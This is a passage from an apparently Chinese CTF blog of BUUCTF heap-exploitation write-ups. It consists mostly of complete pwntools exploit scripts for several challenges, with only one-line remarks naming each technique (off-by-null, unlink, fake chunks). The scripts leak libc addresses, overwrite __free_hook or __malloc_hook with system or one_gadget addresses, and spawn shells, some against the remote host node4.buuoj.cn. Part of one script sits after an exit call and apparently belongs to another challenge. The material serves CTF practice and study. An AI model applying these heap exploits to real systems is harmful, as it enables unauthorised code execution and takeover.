sla(b<span class="string">&quot;do you want to overwrite or append?[1.overwrite/2.append]\n&quot;</span>,str(<span class="number">2</span>))</span><br><span class="line">    sla(b<span class="string">&quot;TheNewContents:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line">sla(b<span class="string">&quot;Input your name:&quot;</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;Input your address:\n&quot;</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">ptr=<span class="number">0x602120</span></span><br><span class="line">add(<span class="number">0x28</span>,p64(<span class="number">0</span>)+p64(<span class="number">0x41</span>)+p64(ptr<span class="number">-0x18</span>)+p64(ptr<span class="number">-0x10</span>))</span><br><span class="line">add(<span class="number">0x0</span>,b<span class="string">&quot;&quot;</span>)</span><br><span class="line">add(<span class="number">0x80</span>,b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>,b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">edit(<span class="number">1</span>,OVERWRITE,b<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p8(<span class="number">0x90</span>))</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">6</span>):</span><br><span class="line">    edit(<span class="number">1</span>,OVERWRITE,b<span class="string">&quot;a&quot;</span>*(<span class="number">0x18</span>-i<span class="number">-1</span>))</span><br><span class="line">edit(<span class="number">1</span>,OVERWRITE,b<span class="string">&quot;a&quot;</span>*<span class="number">0x10</span>+p8(<span class="number">0x40</span>))</span><br><span class="line"></span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">edit(<span class="number">0</span>,OVERWRITE,b<span class="string">&quot;a&quot;</span>*<span class="number">0x18</span>+p64(ptr+<span class="number">0x8</span>))</span><br><span class="line">edit(<span class="number">0</span>,OVERWRITE,p64(elf.got[<span class="string">&quot;puts&quot;</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(b<span class="string">&quot;Content is &quot;</span>)</span><br><span class="line">libc_base=u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>,b<span class="string">&quot;\0&quot;</span>))-libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>,OVERWRITE,p64(libc_base+libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">edit(<span class="number">1</span>,OVERWRITE,p64(libc_base+libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="pwnable-secret-of-my-heart"><a href="#pwnable-secret-of-my-heart" class="headerlink" title="pwnable_secret_of_my_heart"></a>pwnable_secret_of_my_heart</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#pwnable_secret_of_my_heart">https://buuoj.cn/challenges#pwnable_secret_of_my_heart</a></p>
<p>比较简单的off by null题目，伪造一个chunk就好</p>
<p>但最后需要利用malloc跳到realloc然后用跳到realloc的位置来调节栈结构在修改realloc_hook</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">def <span class="title function_">add</span><span class="params">(size: <span class="type">int</span>, name: bytes, secret: bytes)</span>:</span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;choice :&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span></span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;of heart : &quot;</span>, str(size).encode())</span></span><br><span class="line">    <span class="title function_">sa</span><span class="params">(b<span class="string">&quot;Name of heart :&quot;</span>, name)</span></span><br><span class="line">    <span class="title function_">sa</span><span class="params">(b<span class="string">&quot;secret of my heart :&quot;</span>, secret)</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">free</span><span class="params">(index: <span class="type">int</span>)</span>:</span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;choice :&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span></span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;Index :&quot;</span>, str(index).encode())</span></span><br><span class="line"></span><br><span class="line">def <span class="title function_">show</span><span class="params">(index: <span class="type">int</span>)</span>:</span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;choice :&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span></span><br><span class="line">    <span class="title function_">sla</span><span class="params">(b<span class="string">&quot;Index :&quot;</span>, str(index).encode())</span></span><br><span class="line"></span><br><span class="line"><span class="title function_">add</span><span class="params">(<span class="number">0x88</span>, b<span class="string">&quot;a&quot;</span>, b<span class="string">&quot;b&quot;</span>)</span>  # 0</span><br><span class="line"><span class="title function_">add</span><span class="params">(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">32</span>, b<span class="string">&quot;b&quot;</span>)</span>  # 1</span><br><span class="line"><span class="title function_">add</span><span class="params">(<span class="number">0xF0</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">32</span>, b<span class="string">&quot;b&quot;</span>)</span>  # 2</span><br><span class="line"><span class="title function_">add</span><span class="params">(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">32</span>, b<span class="string">&quot;b&quot;</span>)</span>  # 3</span><br><span class="line"><span class="title function_">free</span><span class="params">(<span class="number">0</span>)</span></span><br><span class="line"><span class="title function_">free</span><span class="params">(<span class="number">1</span>)</span></span><br><span class="line"><span class="title function_">add</span><span class="params">(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">32</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x10</span> + p64(<span class="number">0xB0</span>))</span>  # 0</span><br><span class="line"><span class="title function_">free</span><span class="params">(<span class="number">2</span>)</span></span><br><span class="line"><span class="title function_">add</span><span class="params">(<span class="number">0x88</span>, b<span class="string">&quot;a&quot;</span>, b<span class="string">&quot;b&quot;</span>)</span>  # 1</span><br><span class="line"><span class="title function_">show</span><span class="params">(<span class="number">0</span>)</span></span><br><span class="line"><span class="title function_">ru</span><span class="params">(b<span class="string">&quot;cret : &quot;</span>)</span></span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - <span class="number">0x7F640CE62B78</span> + <span class="number">0x7F640CA9E000</span></span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>, b<span class="string">&quot;c&quot;</span>)  # <span class="number">2</span></span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;c&quot;</span>, b<span class="string">&quot;a&quot;</span>)  # <span class="number">4</span></span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">4</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">malloc_hook_addr = libc_base + libc.sym[<span class="string">&quot;__malloc_hook&quot;</span>]</span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>, p64(malloc_hook_addr - <span class="number">0x23</span>))</span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">realloc_addr = libc_base + libc.sym[<span class="string">&quot;__libc_realloc&quot;</span>] + <span class="number">16</span></span><br><span class="line">add(<span class="number">0x68</span>, b<span class="string">&quot;a&quot;</span>, b<span class="string">&quot;b&quot;</span> * <span class="number">11</span> + p64(<span class="number">0x4526A</span> + libc_base) + p64(realloc_addr))</span><br><span class="line">sla(b<span class="string">&quot;choice :&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">sla(b<span class="string">&quot;of heart : &quot;</span>, str(<span class="number">20</span>).encode())</span><br><span class="line">sa(b<span class="string">&quot;Name of heart :&quot;</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="qctf-2018-babyheap"><a href="#qctf-2018-babyheap" class="headerlink" title="qctf_2018_babyheap"></a>qctf_2018_babyheap</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#qctf_2018_babyheap">BUUCTF在线评测</a></p>
<p>简单题</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./QCTF_2018_babyheap&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">28069</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b  </span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/8xg  $rebase(0x202040)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"><span class="meta"># off by null</span></span><br><span class="line">def add(size: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sa(b<span class="string">&quot;choice :\n&quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Size: \n&quot;</span>, str(size).encode())</span><br><span class="line">    <span class="keyword">if</span> len(content) == size:</span><br><span class="line">        sa(b<span class="string">&quot;Data: &quot;</span>, content)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        sla(b<span class="string">&quot;Data: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="meta"># def edit(index: int, content: bytes):</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;Enter index: &quot;</span>, str(index).encode())</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;Enter data: &quot;</span>, content)</span></span><br><span class="line"></span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sa(b<span class="string">&quot;choice :\n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sa(b<span class="string">&quot;Index: \n&quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show():</span><br><span class="line">    sa(b<span class="string">&quot;choice :\n&quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">add(<span class="number">0x418</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x4F8</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x440</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x418</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">show()</span><br><span class="line">ru(b<span class="string">&quot;0 : &quot;</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) + <span class="number">0x7FA38FD37000</span> - <span class="number">0x7FA390122CA0</span></span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0x18</span>, p64(libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">add(<span class="number">0x18</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="cscctf-2019-qual-babyheap"><a href="#cscctf-2019-qual-babyheap" class="headerlink" title="cscctf_2019_qual_babyheap"></a>cscctf_2019_qual_babyheap</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#cscctf_2019_qual_babyheap">BUUCTF在线评测</a></p>
<p>比较简单的unlink,堆块重叠</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br></pre></td><td class="code"><pre><span class="line">#!/usr/bin/python3</span><br><span class="line">#  -*- coding: utf<span class="number">-8</span> -*-</span><br><span class="line"><span class="meta"># from LibcSearcher import LibcSearcheronline</span></span><br><span class="line">from pwn import *</span><br><span class="line"></span><br><span class="line">it = lambda: io.interactive()</span><br><span class="line">ru = lambda x: io.recvuntil(x)</span><br><span class="line">rud = lambda x: io.recvuntil(x, drop=True)</span><br><span class="line">r = lambda x: io.recv(x)</span><br><span class="line">rl = lambda: io.recvline()</span><br><span class="line">rld = lambda: io.recvline(keepends=False)</span><br><span class="line">s = lambda x: io.send(x)</span><br><span class="line">sa = lambda x, y: io.sendafter(x, y)</span><br><span class="line">sl = lambda x: io.sendline(x)</span><br><span class="line">sla = lambda x, y: io.sendlineafter(x, y)</span><br><span class="line"></span><br><span class="line">elf_path = <span class="string">&quot;./cscctf_2019_qual_babyheap&quot;</span></span><br><span class="line">elf = ELF(elf_path)</span><br><span class="line">context(arch=elf.arch, log_level=<span class="string">&quot;debug&quot;</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="string">&quot;2.23&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x45216</span>, <span class="number">0x4526A</span>, <span class="number">0xF02A4</span>, <span class="number">0xF1147</span>]</span><br><span class="line">elif <span class="string">&quot;2.27&quot;</span> in libc.path:</span><br><span class="line">    one_gadget = [<span class="number">0x4F2C5</span>, <span class="number">0x4F322</span>, <span class="number">0x10A38C</span>]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    one_gadget = []</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> len(sys.argv) &gt; <span class="number">1</span>:</span><br><span class="line">    remote_ip = <span class="string">&quot;node4.buuoj.cn&quot;</span></span><br><span class="line">    remote_port = <span class="number">25977</span></span><br><span class="line">    io = remote(remote_ip, remote_port)</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    io = process(elf_path)</span><br><span class="line"></span><br><span class="line">def debug():</span><br><span class="line">    gdbscript = <span class="string">&quot;&quot;</span><span class="string">&quot; </span></span><br><span class="line"><span class="string">    b  </span></span><br><span class="line"><span class="string">    c</span></span><br><span class="line"><span class="string">    x/10xg $rebase(0x2020A0)</span></span><br><span class="line"><span class="string">    &quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line">    gdb.attach(io, gdbscript=gdbscript)</span><br><span class="line"></span><br><span class="line"># &lt;<span class="number">0x100</span>,off by null</span><br><span class="line">def add(index: <span class="type">int</span>, size: <span class="type">int</span>, content: bytes):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;1&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span><br><span class="line">    sla(b<span class="string">&quot;Size: &quot;</span>, str(size).encode())</span><br><span class="line">    sa(b<span class="string">&quot;Content: &quot;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="meta"># def edit(index: int, content: bytes):</span></span><br><span class="line"><span class="meta">#     sla(b<span class="string">&quot;Choice: \n&quot;</span>, b<span class="string">&quot;2&quot;</span>)</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;Enter index: &quot;</span>, str(index).encode())</span></span><br><span class="line"><span class="meta">#     sa(b<span class="string">&quot;Enter data: &quot;</span>, content)</span></span><br><span class="line"></span><br><span class="line"># 清空了</span><br><span class="line">def <span class="built_in">free</span>(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;2&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def show(index: <span class="type">int</span>):</span><br><span class="line">    sla(b<span class="string">&quot;&gt;&gt; &quot;</span>, b<span class="string">&quot;3&quot;</span>)</span><br><span class="line">    sla(b<span class="string">&quot;Index: &quot;</span>, str(index).encode())</span><br><span class="line"></span><br><span class="line">def convert_str_asmencode(content: str):</span><br><span class="line">    out = <span class="string">&quot;&quot;</span></span><br><span class="line">    <span class="keyword">for</span> i in content:</span><br><span class="line">        out = hex(ord(i))[<span class="number">2</span>:] + out</span><br><span class="line">    out = <span class="string">&quot;0x&quot;</span> + out</span><br><span class="line">    <span class="keyword">return</span> out</span><br><span class="line"></span><br><span class="line">add(<span class="number">0</span>, <span class="number">0xF8</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">17</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">8</span>):</span><br><span class="line">    add(i + <span class="number">2</span>, <span class="number">0xF8</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="keyword">for</span> i in range(<span class="number">10</span>, <span class="number">2</span>, <span class="number">-1</span>):</span><br><span class="line">    <span class="built_in">free</span>(i)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>, p64(<span class="number">0</span>) * <span class="number">2</span> + p64(<span class="number">0x120</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line">add(<span class="number">0</span>, <span class="number">0x78</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">2</span>, <span class="number">0x78</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(b<span class="string">&quot;content: &quot;</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - <span class="number">0x7FF32C094CA0</span> + <span class="number">0x7FF32BCA9000</span></span><br><span class="line">add(<span class="number">3</span>, <span class="number">0x18</span>, b<span class="string">&quot;c&quot;</span>)</span><br><span class="line">add(<span class="number">4</span>, <span class="number">0x78</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line">add(<span class="number">5</span>, <span class="number">0x78</span>, b<span class="string">&quot;a&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">3</span>)</span><br><span class="line">add(<span class="number">1</span>, <span class="number">0x18</span>, p64(libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]))</span><br><span class="line">add(<span class="number">6</span>, <span class="number">0x18</span>, b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line">add(<span class="number">7</span>, <span class="number">0x18</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">6</span>)</span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line">it()</span><br><span class="line"><span class="built_in">exit</span>(<span class="number">0</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">0</span>)</span><br><span class="line">ptr = <span class="number">0x602040</span></span><br><span class="line">add(<span class="number">0x28</span>, p64(<span class="number">0</span>) + p64(<span class="number">0x21</span>) + p64(ptr - <span class="number">0x18</span>) + p64(ptr - <span class="number">0x10</span>) + p64(<span class="number">0x20</span>))</span><br><span class="line"><span class="built_in">free</span>(<span class="number">1</span>)</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x17</span>)</span><br><span class="line">edit(<span class="number">0</span>, b<span class="string">&quot;a&quot;</span> * <span class="number">0x18</span> + p64(ptr + <span class="number">8</span>) + p64(elf.got[<span class="string">&quot;puts&quot;</span>]))</span><br><span class="line">show(<span class="number">1</span>)</span><br><span class="line">ru(b<span class="string">&quot;Data: &quot;</span>)</span><br><span class="line">libc_base = u64(ru(b<span class="string">&quot;\x7f&quot;</span>).ljust(<span class="number">8</span>, b<span class="string">&quot;\0&quot;</span>)) - libc.sym[<span class="string">&quot;puts&quot;</span>]</span><br><span class="line">free_hook_addr = libc_base + libc.sym[<span class="string">&quot;__free_hook&quot;</span>]</span><br><span class="line">edit(<span class="number">0</span>, p64(free_hook_addr))</span><br><span class="line">edit(<span class="number">1</span>, p64(libc_base + libc.sym[<span class="string">&quot;system&quot;</span>]))</span><br><span class="line">add(<span class="number">0x18</span>, b<span class="string">&quot;/bin/sh\0&quot;</span>)</span><br><span class="line"><span class="built_in">free</span>(<span class="number">2</span>)</span><br><span class="line"><span class="meta"># debug()</span></span><br><span class="line">it()</span><br></pre></td></tr></table></figure>

<h3 id="sitdtu2019-iz-heap-lv2"><a href="#sitdtu2019-iz-heap-lv2" class="headerlink" title="sitdtu2019_iz_heap_lv2"></a>sitdtu2019_iz_heap_lv2</h3><p><a target="_blank" rel="noopener" href="https://buuoj.cn/challenges#isitdtu2019_iz_heap_lv2">BUUCTF在线评测</a></p>
<p>比较简单的off by null</p>
